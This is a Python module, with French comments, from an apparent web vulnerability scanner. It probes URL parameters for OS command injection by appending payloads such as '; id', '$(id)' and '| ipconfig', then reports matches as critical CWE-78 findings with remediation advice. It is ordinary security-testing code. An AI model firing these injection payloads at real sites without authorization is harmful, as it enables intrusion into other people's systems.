"""
Module : Command Injection (OS).

Injection de séparateurs Unix/Windows (;, |, &&, ||, `, $()) sur les params
qui ressemblent à des commandes (cmd, exec, run, ping, host).

Détection :
  - Signature dans la réponse : "uid=" (id), "Linux", "Windows IP Configuration"
  - Réponse fortement différente (time-based difficile à faire sans bloquer)

OWASP A03 / CWE-78.
"""
from __future__ import annotations
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import re

from scanner.core import http
from scanner.core.module_base import ScannerModule, Finding


class CommandInjectionModule(ScannerModule):
    name = "command-injection"
    category = "injection"
    title = "OS Command Injection"
    description = "Test d'injection de commandes shell sur params suspects."
    default_enabled = False

    SUSPECT_PARAMS = {"cmd", "command", "exec", "run", "ping", "host", "domain",
                      "ip", "target", "address", "shell", "lookup"}

    # Format : (payload, signature attendue)
    PAYLOADS = [
        ("; id",                  r"uid=\d+\(\w+\)"),
        ("|id",                   r"uid=\d+\(\w+\)"),
        ("&& id",                 r"uid=\d+\(\w+\)"),
        ("`id`",                  r"uid=\d+\(\w+\)"),
        ("$(id)",                 r"uid=\d+\(\w+\)"),
        ("; uname -a",            r"Linux|Darwin"),
        ("& whoami",              r"\\?\w+"),
        ("| ipconfig",            r"Windows IP Configuration"),
    ]

    def scan(self, target: str, context: Dict[str, Any]) -> List[Finding]:
        if not re.match(r"^https?://", target):
            return []
        findings: List[Finding] = []
        parsed = urlparse(target)
        params = dict(parse_qsl(parsed.query))

        for param_name, base_value in params.items():
            if param_name.lower() not in self.SUSPECT_PARAMS:
                continue

            for payload, sig in self.PAYLOADS:
                try:
                    new_params = dict(params)
                    new_params[param_name] = base_value + payload
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                    r, req_ev, resp_ev = http.get(test_url, context, capture=True, timeout=8,
                                                   headers={"User-Agent": "VulnScan/1.2"})
                    if r is None:
                        continue
                    if re.search(sig, r.text):
                        match_text = re.search(sig, r.text).group(0)
                        findings.append(Finding(
                            type="command-injection", severity="critical",
                            title="Injection de commande OS confirmée",
                            description=(
                                f"Paramètre '{param_name}' permet d'exécuter des commandes shell. "
                                f"Signature observée : {match_text}"
                            ),
                            recommendation=(
                                "Ne JAMAIS passer une entrée utilisateur à shell_exec/exec/system. "
                                "Utiliser les APIs natives (ex: gethostbyname() au lieu de `ping`)."
                            ),
                            url=target, parameter=param_name,
                            payload=payload,
                            evidence=match_text,
                            confidence=95,
                            cwe_id="CWE-78", owasp_id="A03:2021",
                            cvss_base=9.8,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            detection_method="payload-signature",
                            source="module:command-injection",
                            evidence_request=req_ev, evidence_response=resp_ev,
                        ))
                        break
                except Exception:
                    continue
        return findings
